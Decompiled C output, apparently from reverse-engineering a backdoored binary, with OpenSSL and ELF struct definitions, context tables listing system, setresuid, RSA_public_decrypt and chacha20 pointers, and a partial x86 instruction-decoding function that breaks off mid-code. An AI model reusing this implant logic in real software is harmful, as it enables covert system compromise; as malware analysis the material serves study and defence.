typedef unsigned char   undefined;

typedef unsigned char    bool;
typedef unsigned char    byte;
typedef unsigned int    dword;
typedef unsigned long    qword;
typedef unsigned char    uchar;
typedef unsigned int    uint;
typedef unsigned long    ulong;
typedef unsigned long long    ulonglong;
typedef unsigned char    undefined1;
typedef unsigned short    undefined2;
typedef unsigned int    undefined4;
typedef unsigned long    undefined8;
typedef unsigned short    word;
typedef pointer pointer __((offset(-0x180)));

typedef pointer pointer __((offset(-0x2a0)));

typedef struct stack_st stack_st, *Pstack_st;

typedef struct stack_st _STACK;

struct stack_st {
    int num;
    char **data;
    int sorted;
    int num_alloc;
    int (*comp)(void *, void *);
};

typedef union _union_181 _union_181, *P_union_181;

typedef struct bn_gencb_st bn_gencb_st, *Pbn_gencb_st;

typedef struct bn_gencb_st BN_GENCB;

union _union_181 {
    void (*cb_1)(int, int, void *);
    int (*cb_2)(int, int, BN_GENCB *);
};

struct bn_gencb_st {
    uint ver;
    void *arg;
    union _union_181 cb;
};

typedef struct stack_st_void stack_st_void, *Pstack_st_void;

struct stack_st_void {
    _STACK stack;
};

typedef ulong size_t;

typedef struct rsa_st rsa_st, *Prsa_st;

typedef struct rsa_st RSA;

typedef struct rsa_meth_st rsa_meth_st, *Prsa_meth_st;

typedef struct bignum_st bignum_st, *Pbignum_st;

typedef struct bignum_st BIGNUM;

typedef struct bignum_ctx bignum_ctx, *Pbignum_ctx;

typedef struct bignum_ctx BN_CTX;

typedef struct bn_mont_ctx_st bn_mont_ctx_st, *Pbn_mont_ctx_st;

typedef struct bn_mont_ctx_st BN_MONT_CTX;

typedef struct rsa_meth_st RSA_METHOD;

typedef struct engine_st engine_st, *Pengine_st;

typedef struct engine_st ENGINE;

typedef struct crypto_ex_data_st crypto_ex_data_st, *Pcrypto_ex_data_st;

typedef struct crypto_ex_data_st CRYPTO_EX_DATA;

typedef struct bn_blinding_st bn_blinding_st, *Pbn_blinding_st;

typedef struct bn_blinding_st BN_BLINDING;

struct crypto_ex_data_st {
    struct stack_st_void *sk;
    int dummy;
};

struct bignum_st {
    ulong *d;
    int top;
    int dmax;
    int neg;
    int flags;
};

struct rsa_meth_st {
    char *name;
    int (*rsa_pub_enc)(int, uchar *, uchar *, RSA *, int);
    int (*rsa_pub_dec)(int, uchar *, uchar *, RSA *, int);
    int (*rsa_priv_enc)(int, uchar *, uchar *, RSA *, int);
    int (*rsa_priv_dec)(int, uchar *, uchar *, RSA *, int);
    int (*rsa_mod_exp)(BIGNUM *, BIGNUM *, RSA *, BN_CTX *);
    int (*bn_mod_exp)(BIGNUM *, BIGNUM *, BIGNUM *, BIGNUM *, BN_CTX *, BN_MONT_CTX *);
    int (*init)(RSA *);
    int (*finish)(RSA *);
    int flags;
    char *app_data;
    int (*rsa_sign)(int, uchar *, uint, uchar *, uint *, RSA *);
    int (*rsa_verify)(int, uchar *, uint, uchar *, uint, RSA *);
    int (*rsa_keygen)(RSA *, int, BIGNUM *, BN_GENCB *);
};

struct engine_st {
};

struct bn_blinding_st {
};

struct bignum_ctx {
};

struct rsa_st {
    int pad;
    long version;
    RSA_METHOD *meth;
    ENGINE *engine;
    BIGNUM *n;
    BIGNUM *e;
    BIGNUM *d;
    BIGNUM *p;
    BIGNUM *q;
    BIGNUM *dmp1;
    BIGNUM *dmq1;
    BIGNUM *iqmp;
    CRYPTO_EX_DATA ex_data;
    int references;
    int flags;
    BN_MONT_CTX *_method_mod_n;
    BN_MONT_CTX *_method_mod_p;
    BN_MONT_CTX *_method_mod_q;
    char *bignum_data;
    BN_BLINDING *blinding;
    BN_BLINDING *mt_blinding;
};

struct bn_mont_ctx_st {
    int ri;
    BIGNUM RR;
    BIGNUM N;
    BIGNUM Ni;
    ulong n0[2];
    int flags;
};

typedef struct ctx2 ctx2, *Pctx2;

typedef struct ctx ctx, *Pctx;

struct ctx {
    int num_imports;
    undefined field1_0x4;
    undefined field2_0x5;
    undefined field3_0x6;
    undefined field4_0x7;
    undefined field5_0x8;
    undefined field6_0x9;
    undefined field7_0xa;
    undefined field8_0xb;
    undefined field9_0xc;
    undefined field10_0xd;
    undefined field11_0xe;
    undefined field12_0xf;
    void *fn_getuid; // Created by retype action
    void *fn__exit; // Created by retype action
    void *fn_setresgid; // Created by retype action
    void *fn_setresuid; // Created by retype action
    void *fn_system; // Created by retype action
    void *fn_write; // Created by retype action
    void *fn_pselect; // Created by retype action
    void *fn_read;
    void *__errno_location;
    void *fn_setlogmask;
    void *fn_shutdown;
};

struct ctx2 {
    undefined field0_0x0;
    undefined field1_0x1;
    undefined field2_0x2;
    undefined field3_0x3;
    undefined field4_0x4;
    undefined field5_0x5;
    undefined field6_0x6;
    undefined field7_0x7;
    undefined field8_0x8;
    undefined field9_0x9;
    undefined field10_0xa;
    undefined field11_0xb;
    undefined field12_0xc;
    undefined field13_0xd;
    undefined field14_0xe;
    undefined field15_0xf;
    undefined field16_0x10;
    undefined field17_0x11;
    undefined field18_0x12;
    undefined field19_0x13;
    undefined field20_0x14;
    undefined field21_0x15;
    undefined field22_0x16;
    undefined field23_0x17;
    undefined field24_0x18;
    undefined field25_0x19;
    undefined field26_0x1a;
    undefined field27_0x1b;
    undefined field28_0x1c;
    undefined field29_0x1d;
    undefined field30_0x1e;
    undefined field31_0x1f;
    undefined field32_0x20;
    undefined field33_0x21;
    undefined field34_0x22;
    undefined field35_0x23;
    undefined field36_0x24;
    undefined field37_0x25;
    undefined field38_0x26;
    undefined field39_0x27;
    undefined field40_0x28;
    undefined field41_0x29;
    undefined field42_0x2a;
    undefined field43_0x2b;
    undefined field44_0x2c;
    undefined field45_0x2d;
    undefined field46_0x2e;
    undefined field47_0x2f;
    long field48_0x30;
    void *fn_DSA_get0_pub_key;
    undefined field50_0x40;
    undefined field51_0x41;
    undefined field52_0x42;
    undefined field53_0x43;
    undefined field54_0x44;
    undefined field55_0x45;
    undefined field56_0x46;
    undefined field57_0x47;
    void *fn_RSA_public_decrypt; // Created by retype action
    void *fn_EC_KEY_get0_group; // Created by retype action
    undefined field60_0x58;
    undefined field61_0x59;
    undefined field62_0x5a;
    undefined field63_0x5b;
    undefined field64_0x5c;
    undefined field65_0x5d;
    undefined field66_0x5e;
    undefined field67_0x5f;
    undefined field68_0x60;
    undefined field69_0x61;
    undefined field70_0x62;
    undefined field71_0x63;
    undefined field72_0x64;
    undefined field73_0x65;
    undefined field74_0x66;
    undefined field75_0x67;
    undefined field76_0x68;
    undefined field77_0x69;
    undefined field78_0x6a;
    undefined field79_0x6b;
    undefined field80_0x6c;
    undefined field81_0x6d;
    undefined field82_0x6e;
    undefined field83_0x6f;
    undefined field84_0x70;
    undefined field85_0x71;
    undefined field86_0x72;
    undefined field87_0x73;
    undefined field88_0x74;
    undefined field89_0x75;
    undefined field90_0x76;
    undefined field91_0x77;
    undefined field92_0x78;
    undefined field93_0x79;
    undefined field94_0x7a;
    undefined field95_0x7b;
    undefined field96_0x7c;
    undefined field97_0x7d;
    undefined field98_0x7e;
    undefined field99_0x7f;
    void *fn_EVP_DigestVerifyInit; // Created by retype action
    undefined field101_0x88;
    undefined field102_0x89;
    undefined field103_0x8a;
    undefined field104_0x8b;
    undefined field105_0x8c;
    undefined field106_0x8d;
    undefined field107_0x8e;
    undefined field108_0x8f;
    void *fn_EVP_MD_CTX_free;
    void *fn_EVP_PKEY_free; // Created by retype action
    undefined field111_0xa0;
    undefined field112_0xa1;
    undefined field113_0xa2;
    undefined field114_0xa3;
    undefined field115_0xa4;
    undefined field116_0xa5;
    undefined field117_0xa6;
    undefined field118_0xa7;
    void *fn_EVP_DecryptInit_ex; // Created by retype action
    undefined field120_0xb0;
    undefined field121_0xb1;
    undefined field122_0xb2;
    undefined field123_0xb3;
    undefined field124_0xb4;
    undefined field125_0xb5;
    undefined field126_0xb6;
    undefined field127_0xb7;
    undefined field128_0xb8;
    undefined field129_0xb9;
    undefined field130_0xba;
    undefined field131_0xbb;
    undefined field132_0xbc;
    undefined field133_0xbd;
    undefined field134_0xbe;
    undefined field135_0xbf;
    void *fn_EVP_CIPHER_CTX_free; // Created by retype action
    void *fn_EVP_chacha20; // Created by retype action
    undefined field138_0xd0;
    undefined field139_0xd1;
    undefined field140_0xd2;
    undefined field141_0xd3;
    undefined field142_0xd4;
    undefined field143_0xd5;
    undefined field144_0xd6;
    undefined field145_0xd7;
    undefined field146_0xd8;
    undefined field147_0xd9;
    undefined field148_0xda;
    undefined field149_0xdb;
    undefined field150_0xdc;
    undefined field151_0xdd;
    undefined field152_0xde;
    undefined field153_0xdf;
    undefined field154_0xe0;
    undefined field155_0xe1;
    undefined field156_0xe2;
    undefined field157_0xe3;
    undefined field158_0xe4;
    undefined field159_0xe5;
    undefined field160_0xe6;
    undefined field161_0xe7;
    undefined field162_0xe8;
    undefined field163_0xe9;
    undefined field164_0xea;
    undefined field165_0xeb;
    undefined field166_0xec;
    undefined field167_0xed;
    undefined field168_0xee;
    undefined field169_0xef;
    undefined field170_0xf0;
    undefined field171_0xf1;
    undefined field172_0xf2;
    undefined field173_0xf3;
    undefined field174_0xf4;
    undefined field175_0xf5;
    undefined field176_0xf6;
    undefined field177_0xf7;
    undefined field178_0xf8;
    undefined field179_0xf9;
    undefined field180_0xfa;
    undefined field181_0xfb;
    undefined field182_0xfc;
    undefined field183_0xfd;
    undefined field184_0xfe;
    undefined field185_0xff;
    undefined field186_0x100;
    undefined field187_0x101;
    undefined field188_0x102;
    undefined field189_0x103;
    undefined field190_0x104;
    undefined field191_0x105;
    undefined field192_0x106;
    undefined field193_0x107;
    undefined field194_0x108;
    undefined field195_0x109;
    undefined field196_0x10a;
    undefined field197_0x10b;
    undefined field198_0x10c;
    undefined field199_0x10d;
    undefined field200_0x10e;
    undefined field201_0x10f;
    undefined field202_0x110;
    undefined field203_0x111;
    undefined field204_0x112;
    undefined field205_0x113;
    undefined field206_0x114;
    undefined field207_0x115;
    undefined field208_0x116;
    undefined field209_0x117;
    undefined field210_0x118;
    undefined field211_0x119;
    undefined field212_0x11a;
    undefined field213_0x11b;
    undefined field214_0x11c;
    undefined field215_0x11d;
    undefined field216_0x11e;
    undefined field217_0x11f;
    struct ctx ctx;
};

typedef struct Elf64_Rela Elf64_Rela, *PElf64_Rela;

struct Elf64_Rela {
    qword r_offset; // location to apply the relocation action
    qword r_info; // the symbol table index and the type of relocation
    qword r_addend; // a constant addend used to compute the relocatable field value
};

typedef struct Elf64_Ehdr Elf64_Ehdr, *PElf64_Ehdr;

struct Elf64_Ehdr {
    byte e_ident_magic_num;
    char e_ident_magic_str[3];
    byte e_ident_class;
    byte e_ident_data;
    byte e_ident_version;
    byte e_ident_osabi;
    byte e_ident_abiversion;
    byte e_ident_pad[7];
    word e_type;
    word e_machine;
    dword e_version;
    qword e_entry;
    qword e_phoff;
    qword e_shoff;
    dword e_flags;
    word e_ehsize;
    word e_phentsize;
    word e_phnum;
    word e_shentsize;
    word e_shnum;
    word e_shstrndx;
};

typedef struct Elf64_Shdr Elf64_Shdr, *PElf64_Shdr;

typedef enum Elf_SectionHeaderType {
    SHT_NULL=0,
    SHT_PROGBITS=1,
    SHT_SYMTAB=2,
    SHT_STRTAB=3,
    SHT_RELA=4,
    SHT_HASH=5,
    SHT_DYNAMIC=6,
    SHT_NOTE=7,
    SHT_NOBITS=8,
    SHT_REL=9,
    SHT_SHLIB=10,
    SHT_DYNSYM=11,
    SHT_INIT_ARRAY=14,
    SHT_FINI_ARRAY=15,
    SHT_PREINIT_ARRAY=16,
    SHT_GROUP=17,
    SHT_SYMTAB_SHNDX=18,
    SHT_ANDROID_REL=1610612737,
    SHT_ANDROID_RELA=1610612738,
    SHT_GNU_ATTRIBUTES=1879048181,
    SHT_GNU_HASH=1879048182,
    SHT_GNU_LIBLIST=1879048183,
    SHT_CHECKSUM=1879048184,
    SHT_SUNW_move=1879048186,
    SHT_SUNW_COMDAT=1879048187,
    SHT_SUNW_syminfo=1879048188,
    SHT_GNU_verdef=1879048189,
    SHT_GNU_verneed=1879048190,
    SHT_GNU_versym=1879048191
} Elf_SectionHeaderType;

struct Elf64_Shdr {
    dword sh_name;
    enum Elf_SectionHeaderType sh_type;
    qword sh_flags;
    qword sh_addr;
    qword sh_offset;
    qword sh_size;
    dword sh_link;
    dword sh_info;
    qword sh_addralign;
    qword sh_entsize;
};

typedef struct Elf64_Sym Elf64_Sym, *PElf64_Sym;

struct Elf64_Sym {
    dword st_name;
    byte st_info;
    byte st_other;
    word st_shndx;
    qword st_value;
    qword st_size;
};

typedef ulonglong uint64_t;




undefined8 code_dasm(byte **param_1,byte *param_2,byte *param_3)

{
  byte bVar1;
  ushort uVar2;
  byte bVar3;
  int iVar4;
  uint uVar5;
  sbyte sVar6;
  byte bVar7;
  uint uVar8;
  long lVar9;
  byte *pbVar10;
  byte *pbVar11;
  byte bVar12;
  uint uVar13;
  ulong uVar14;
  byte *pbVar15;
  ulong uVar16;
  byte **ppbVar17;
  bool bVar18;
  bool bVar19;
  byte bVar20;
  ulong local_38 [4];
  
  bVar20 = 0;
  iVar4 = apply_one_entry_ex(0,0x12,0x46,2);
  if (iVar4 == 0) {
    return 0;
  }
  ppbVar17 = param_1;
  for (lVar9 = 0x16; lVar9 != 0; lVar9 = lVar9 + -1) {
    *(undefined4 *)ppbVar17 = 0;
    ppbVar17 = (byte **)((long)ppbVar17 + (ulong)bVar20 * -8 + 4);
  }
  bVar18 = param_2 < param_3;
  pbVar10 = param_2;
  do {
    if (!bVar18) {
LAB_00100a85:
      for (lVar9 = 0x16; lVar9 != 0; lVar9 = lVar9 + -1) {
        *(undefined4 *)param_1 = 0;
        param_1 = (byte **)((long)param_1 + (ulong)bVar20 * -8 + 4);
      }
      return 0;
    }
    bVar12 = *pbVar10;
    if (bVar12 < 0x68) {
      if (bVar12 < 0x2e) {
        if (bVar12 == 0xf) {
          *(undefined4 *)(param_1 + 5) = 0xf;
          pbVar10 = pbVar10 + 1;
LAB_001001a9:
          if (param_3 <= pbVar10) goto LAB_00100a85;
          iVar4 = *(int *)(param_1 + 5);
          *(int *)(param_1 + 5) = iVar4 << 8;
          bVar3 = *pbVar10;
          uVar5 = (uint)bVar3 | iVar4 << 8;
          *(uint *)(param_1 + 5) = uVar5;
          bVar12 = *pbVar10;
          if ((bVar12 & 0xfd) == 0x38) {
            if ((*(byte *)(param_1 + 2) & 0x10) != 0) {
              return 0;
            }
            pbVar10 = pbVar10 + 1;
            goto LAB_001003da;
          }
          if (((int)(uint)(byte)(&DAT_0010ad60)[bVar12 >> 3] >> (bVar12 & 7) & 1U) == 0) {
            return 0;
          }
          if ((*(char *)((long)param_1 + 0x14) == -0xd) && (bVar12 == 0x1e)) {
            if (pbVar10 + 1 < param_3) {
              ppbVar17 = param_1 + 2;
              for (lVar9 = 0x12; lVar9 != 0; lVar9 = lVar9 + -1) {
                *(undefined4 *)ppbVar17 = 0;
                ppbVar17 = (byte **)((long)ppbVar17 + (ulong)bVar20 * -8 + 4);
              }
              *param_1 = param_2;
              param_1[1] = (byte *)0x4;
              iVar4 = (pbVar10[1] == 0xfa) + 0xa5fc + (uint)(pbVar10[1] == 0xfa);
LAB_001004d1:
              *(int *)(param_1 + 5) = iVar4;
              return 1;
            }
            goto LAB_00100a85;
          }
          *(char *)(param_1 + 10) = (char)((long)pbVar10 - (long)param_2);
          uVar13 = uVar5;
          if ((*(byte *)(param_1 + 2) & 0x10) != 0) {
            uVar13 = (uint)bVar3;
          }
          if ((uVar13 & 0xf0) == 0x80) {
            pbVar11 = (byte *)0x4;
LAB_00100487:
            *(byte *)((long)param_1 + 0x11) = *(byte *)((long)param_1 + 0x11) | 8;
            param_1[9] = pbVar11;
          }
          else {
            if ((byte)uVar13 < 0x74) {
              if (0x6f < (uVar13 & 0xff)) {
LAB_00100482:
                pbVar11 = (byte *)0x1;
                goto LAB_00100487;
              }
            }
            else {
              uVar8 = (uVar13 & 0xff) - 0xa4;
              if ((uVar8 < 0x23) && ((0x740400101U >> ((byte)uVar8 & 0x3f) & 1) != 0))
              goto LAB_00100482;
            }
            param_1[9] = (byte *)0x0;
          }
          pbVar11 = pbVar10;
          if (((byte)(&DAT_0010ad40)[uVar13 >> 3 & 0x1f] >> (uVar13 & 7) & 1) == 0) {
            if ((*(byte *)((long)param_1 + 0x11) & 8) != 0) goto LAB_0010065d;
            *param_1 = param_2;
            pbVar10 = (byte *)(((long)pbVar10 - (long)param_2) + 1);
          }
          else {
LAB_001008a5:
            pbVar10 = pbVar11 + 1;
            if (param_3 <= pbVar10) goto LAB_00100a85;
            bVar12 = *(byte *)(param_1 + 2);
            *(byte *)(param_1 + 2) = bVar12 | 0x40;
            bVar3 = *pbVar10;
            *(byte *)((long)param_1 + 0x1c) = bVar3;
            bVar3 = bVar3 >> 6;
            *(byte *)((long)param_1 + 0x1d) = bVar3;
            bVar1 = *pbVar10;
            *(byte *)((long)param_1 + 0x1e) = (byte)((int)(uint)bVar1 >> 3) & 7;
            bVar7 = *pbVar10;
            *(byte *)((long)param_1 + 0x1f) = bVar7 & 7;
            if (bVar3 == 3) {
LAB_001008e2:
              if ((*(uint *)((long)param_1 + 0x1c) & 0xff00ff00) == 0x5000000) {
LAB_0010090e:
                *(byte *)((long)param_1 + 0x11) = *(byte *)((long)param_1 + 0x11) | 1;
              }
            }
            else {
              if ((bVar7 & 7) == 4) {
                *(byte *)(param_1 + 2) = bVar12 | 0xc0;
              }
              if (bVar3 != 1) {
                if (bVar3 != 2) goto LAB_001008e2;
                goto LAB_0010090e;
              }
              *(byte *)((long)param_1 + 0x11) = *(byte *)((long)param_1 + 0x11) | 3;
            }
            uVar5 = *(uint *)(param_1 + 5);
            if ((uVar5 - 0xf6 < 2) && (((int)(uint)bVar1 >> 3 & 7U) != 0)) {
              *(byte *)((long)param_1 + 0x11) = *(byte *)((long)param_1 + 0x11) & 0xf7;
              param_1[9] = (byte *)0x0;
            }
            if (*(char *)(param_1 + 2) < '\0') {
              if (param_3 <= pbVar11 + 2) goto LAB_00100a85;
              bVar12 = pbVar11[2];
              *(byte *)((long)param_1 + 0x21) = bVar12;
              *(byte *)((long)param_1 + 0x22) = bVar12 >> 6;
              *(byte *)((long)param_1 + 0x23) = (byte)((int)(uint)pbVar11[2] >> 3) & 7;
              bVar12 = pbVar11[2];
              *(byte *)((long)param_1 + 0x24) = bVar12 & 7;
              if ((bVar12 & 7) == 5) {
                if ((*(byte *)((long)param_1 + 0x1d) & 0xfd) == 0) {
                  *(byte *)((long)param_1 + 0x11) = *(byte *)((long)param_1 + 0x11) | 1;
                }
                else if (*(byte *)((long)param_1 + 0x1d) == 1) {
                  *(byte *)((long)param_1 + 0x11) = *(byte *)((long)param_1 + 0x11) | 3;
                }
              }
              bVar12 = *(byte *)((long)param_1 + 0x11);
              if ((bVar12 & 2) == 0) {
                if ((bVar12 & 1) != 0) {
                  pbVar11 = pbVar11 + 3;
                  goto LAB_0010071c;
                }
                if ((bVar12 & 8) != 0) {
                  pbVar10 = pbVar11 + 3;
                  goto LAB_00100660;
                }
                *param_1 = param_2;
                pbVar10 = pbVar11 + 2 + (1 - (long)param_2);
                goto LAB_001004c1;
              }
              pbVar10 = pbVar11 + 3;
LAB_001009ca:
              if (param_3 <= pbVar10) goto LAB_00100a85;
              bVar12 = *(byte *)((long)param_1 + 0x11);
              param_1[6] = (byte *)(long)(char)*pbVar10;
            }
            else {
              bVar12 = *(byte *)((long)param_1 + 0x11);
              if ((bVar12 & 2) != 0) {
                pbVar10 = pbVar11 + 2;
                goto LAB_001009ca;
              }
              if ((bVar12 & 1) != 0) goto LAB_0010063f;
            }
            if ((bVar12 & 8) != 0) goto LAB_0010065d;
            *param_1 = param_2;
            pbVar10 = pbVar10 + (1 - (long)param_2);
          }
LAB_001004c1:
          param_1[1] = pbVar10;
          if (pbVar10 == (byte *)0x0) {
            return 0;
          }
          goto LAB_001004ce;
        }
        if (bVar12 != 0x26) goto LAB_00100171;
      }
      else if ((0xc0000000010101U >> ((ulong)(bVar12 - 0x2e) & 0x3f) & 1) == 0) {
        if (bVar12 == 0x67) {
          if ((*(byte *)(param_1 + 2) & 8) != 0) {
            return 0;
          }
          *(byte *)(param_1 + 2) = *(byte *)(param_1 + 2) | 8;
          *(byte *)((long)param_1 + 0x17) = *pbVar10;
        }
        else {
          if (bVar12 != 0x66) {
            if ((bVar12 & 0xf0) == 0x40) {
              *(byte *)(param_1 + 2) = *(byte *)(param_1 + 2) | 0x20;
              bVar12 = *pbVar10;
              pbVar10 = pbVar10 + 1;
              *(byte *)((long)param_1 + 0x1b) = bVar12;
            }
            goto LAB_00100171;
          }
          if (((*(byte *)(param_1 + 2) & 4) != 0) && (*(char *)((long)param_1 + 0x16) != 'f')) {
            return 0;
          }
          if ((*(byte *)(param_1 + 2) & 0x20) == 0) {
            *(byte *)(param_1 + 2) = *(byte *)(param_1 + 2) | 4;
            *(byte *)((long)param_1 + 0x16) = *pbVar10;
          }
        }
        goto LAB_00100655;
      }
      if ((*(byte *)(param_1 + 2) & 2) != 0) {
        return 0;
      }
      *(byte *)(param_1 + 2) = *(byte *)(param_1 + 2) | 2;
      *(byte *)((long)param_1 + 0x15) = *pbVar10;
    }
    else {
      if (bVar12 != 0xf0) {
        if (bVar12 < 0xf1) {
          if (1 < (byte)(bVar12 + 0x3c)) goto LAB_00100171;
          if ((*(byte *)(param_1 + 2) & 0x20) != 0) {
            return 0;
          }
          *(uint *)(param_1 + 5) = (uint)bVar12;
          bVar3 = *pbVar10;
          pbVar11 = pbVar10 + 1;
          *(byte *)(param_1 + 2) = *(byte *)(param_1 + 2) | 0x10;
          *(byte *)(param_1 + 3) = bVar3;
          if (param_3 <= pbVar11) goto LAB_00100a85;
          bVar7 = pbVar10[1];
          *(undefined *)((long)param_1 + 0x1b) = 0x40;
          uVar5 = (uint)bVar12 << 8 | 0xf;
          *(byte *)((long)param_1 + 0x19) = bVar7;
          *(uint *)(param_1 + 5) = uVar5;
          bVar12 = ((char)pbVar10[1] >> 7 & 0xfcU) + 0x44;
          *(byte *)((long)param_1 + 0x1b) = bVar12;
          if (bVar3 == 0xc5) goto LAB_001001a5;
          if (bVar3 != 0xc4) {
            return 0;
          }
          bVar3 = pbVar10[1];
          if ((bVar3 & 0x40) == 0) {
            *(byte *)((long)param_1 + 0x1b) = bVar12 | 2;
          }
          if ((pbVar10[1] & 0x20) == 0) {
            *(byte *)((long)param_1 + 0x1b) = *(byte *)((long)param_1 + 0x1b) | 1;
          }
          if (2 < (byte)((bVar3 & 0x1f) - 1)) {
            return 0;
          }
          if (param_3 <= pbVar10 + 2) goto LAB_00100a85;
          bVar12 = pbVar10[2];
          bVar7 = bVar7 & 0x1f;
          *(byte *)((long)param_1 + 0x1a) = bVar12;
          if (-1 < (char)bVar12) {
            *(byte *)((long)param_1 + 0x1b) = *(byte *)((long)param_1 + 0x1b) | 8;
          }
          uVar5 = uVar5 << 8;
          *(uint *)(param_1 + 5) = uVar5;
          if (bVar7 == 2) {
            uVar5 = uVar5 | 0x38;
          }
          else {
            if (bVar7 != 3) {
              if (bVar7 != 1) {
                return 0;
              }
              pbVar10 = pbVar10 + 3;
              goto LAB_001001a9;
            }
            uVar5 = uVar5 | 0x3a;
          }
          *(uint *)(param_1 + 5) = uVar5;
          pbVar10 = pbVar10 + 3;
LAB_001003da:
          if (param_3 <= pbVar10) goto LAB_00100a85;
          uVar8 = *(int *)(param_1 + 5) << 8;
          *(uint *)(param_1 + 5) = uVar8;
          bVar12 = *pbVar10;
          uVar5 = bVar12 | uVar8;
          *(uint *)(param_1 + 5) = uVar5;
          uVar13 = uVar5;
          if ((*(byte *)(param_1 + 2) & 0x10) != 0) {
            uVar13 = (uint)bVar12 | uVar8 & 0xffffff;
          }
          uVar8 = uVar13 & 0xff00;
          pbVar11 = pbVar10;
          if (uVar8 != 0x3800) {
            uVar5 = uVar13 & 0xff;
            bVar12 = (byte)uVar13;
            if (bVar12 < 0xf1) {
              if (uVar5 < 0xcc) {
                if (uVar5 < 0x3a) {
                  if (0x37 < uVar5) goto LAB_0010059f;
                  bVar18 = uVar5 - 0x20 < 2;
                  bVar19 = uVar5 - 0x20 == 2;
                }
                else {
                  bVar18 = uVar5 - 0x60 < 3;
                  bVar19 = uVar5 - 0x60 == 3;
                }
                if (!bVar18 && !bVar19) goto LAB_001005b6;
              }
              else if ((0x1000080001U >> (bVar12 + 0x34 & 0x3f) & 1) == 0) goto LAB_001005b6;
LAB_0010059f:
              *(char *)(param_1 + 10) = (char)pbVar10 - (char)param_2;
              if (uVar8 == 0x3a00) {
LAB_0010061c:
                *(byte *)((long)param_1 + 0x11) = *(byte *)((long)param_1 + 0x11) | 8;
                param_1[9] = (byte *)0x1;
                goto LAB_001008a5;
              }
            }
            else {
LAB_001005b6:
              bVar3 = bVar12 & 0xf;
              if (bVar12 >> 4 == 1) {
                if (bVar3 < 10) {
                  bVar18 = (uVar13 & 0xc) == 0;
                  goto LAB_001005e4;
                }
                if (bVar3 != 0xd) {
                  return 0;
                }
              }
              else {
                if (bVar12 >> 4 == 4) {
                  bVar18 = (0x1c57UL >> bVar3 & 1) == 0;
                }
                else {
                  if (bVar12 >> 4 != 0) {
                    return 0;
                  }
                  bVar18 = (bVar12 & 0xb) == 3;
                }
LAB_001005e4:
                if (bVar18) {
                  return 0;
                }
              }
              *(char *)(param_1 + 10) = (char)pbVar10 - (char)param_2;
              if ((uVar8 == 0x3a00) && (2 < uVar5 - 0x4a)) goto LAB_0010061c;
            }
            param_1[9] = (byte *)0x0;
            goto LAB_001008a5;
          }
          uVar8 = uVar13 >> 3 & 0x1f;
          if (((byte)(&DAT_0010ad20)[uVar8] >> (uVar13 & 7) & 1) == 0) {
            return 0;
          }
          param_1[9] = (byte *)0x0;
          bVar12 = (&DAT_0010ad00)[uVar8];
          *(char *)(param_1 + 10) = (char)((long)pbVar10 - (long)param_2);
          if ((bVar12 >> (uVar13 & 7) & 1) != 0) goto LAB_001008a5;
          if ((*(byte *)((long)param_1 + 0x11) & 8) == 0) {
            *param_1 = param_2;
            pbVar10 = (byte *)(((long)pbVar10 - (long)param_2) + 1);
            goto LAB_001004c1;
          }
LAB_0010065d:
          pbVar10 = pbVar10 + 1;
LAB_00100660:
          if (param_3 <= pbVar10) goto LAB_00100a85;
          pbVar11 = param_1[9];
          bVar12 = *pbVar10;
          if (pbVar11 != (byte *)0x1) {
            pbVar15 = pbVar10 + 1;
            if (((ulong)param_1[2] & 0xff000000000004) == 0x66000000000004) {
              if (pbVar11 == (byte *)0x2) {
                param_1[9] = (byte *)0x4;
              }
              else if (pbVar11 == (byte *)0x4) {
                param_1[9] = (byte *)0x2;
              }
            }
            if (param_3 <= pbVar15) goto LAB_00100a85;
            uVar2 = CONCAT11(*pbVar15,bVar12);
            if (param_1[9] == (byte *)0x2) {
              param_1[8] = (byte *)(ulong)uVar2;
              param_1[7] = (byte *)(long)(short)uVar2;
              pbVar10 = pbVar15 + (1 - (long)param_2);
              *param_1 = param_2;
              goto LAB_001007c4;
            }
            if (param_3 <= pbVar10 + 2) goto LAB_00100a85;
            pbVar15 = pbVar10 + 3;
            if (param_3 <= pbVar15) goto LAB_00100a85;
            uVar5 = CONCAT13(pbVar10[3],CONCAT12(pbVar10[2],uVar2));
            if (param_1[9] == (byte *)0x4) {
              param_1[8] = (byte *)(ulong)uVar5;
              pbVar10 = (byte *)(long)(int)uVar5;
            }
            else {
              if (((param_3 <= pbVar10 + 4) || (param_3 <= pbVar10 + 5)) || (param_3 <= pbVar10 + 6)
                 ) goto LAB_00100a85;
              pbVar15 = pbVar10 + 7;
              if (param_3 <= pbVar15) goto LAB_00100a85;
              pbVar10 = (byte *)CONCAT17(pbVar10[7],
                                         CONCAT16(pbVar10[6],
                                                  CONCAT15(pbVar10[5],CONCAT14(pbVar10[4],uVar5))));
              param_1[8] = pbVar10;
            }
            param_1[7] = pbVar10;
            goto LAB_0010087f;
          }
          param_1[8] = (byte *)(ulong)bVar12;
          pbVar10 = pbVar10 + (1 - (long)param_2);
          param_1[7] = (byte *)(long)(char)bVar12;
          *param_1 = param_2;
          param_1[1] = pbVar10;
        }
        else {
          if ((byte)(bVar12 + 0xe) < 2) goto LAB_001000af;
LAB_00100171:
          if (param_3 <= pbVar10) goto LAB_00100a85;
          bVar12 = *pbVar10;
          uVar16 = (ulong)bVar12;
          if (bVar12 == 0xf) {
            *(undefined4 *)(param_1 + 5) = 0xf;
            pbVar11 = pbVar10;
LAB_001001a5:
            pbVar10 = pbVar11 + 1;
            goto LAB_001001a9;
          }
          uVar5 = (uint)bVar12;
          uVar13 = bVar12 & 7;
          if (((byte)(&DAT_0010ada0)[bVar12 >> 3] >> uVar13 & 1) != 0) {
            return 0;
          }
          *(uint *)(param_1 + 5) = (uint)bVar12;
          local_38[0] = 0x3030303030303030;
          *(char *)(param_1 + 10) = (char)((long)pbVar10 - (long)param_2);
          local_38[1] = 0xffff0fc000000000;
          local_38[2] = 0xffff03000000000b;
          local_38[3] = 0xc00bff000025c7;
          uVar14 = local_38[bVar12 >> 6] >> (bVar12 & 0x3f);
          pbVar11 = (byte *)(ulong)((uint)uVar14 & 1);
          if ((uVar14 & 1) == 0) {
            param_1[9] = (byte *)0x0;
          }
          else {
            if (bVar12 < 0xf8) {
              if (bVar12 < 0xc2) {
                if (bVar12 < 0x6a) {
                  if (bVar12 < 0x2d) {
                    if (0x20 < (byte)(bVar12 - 5)) goto LAB_00100324;
                    uVar14 = 0x2020202020;
                  }
                  else {
                    uVar14 = 0x1800000000010101;
                    uVar16 = (ulong)(bVar12 - 0x2d);
                  }
                }
                else {
                  uVar14 = 0x7f80010000000001;
                  uVar16 = (ulong)(bVar12 + 0x7f);
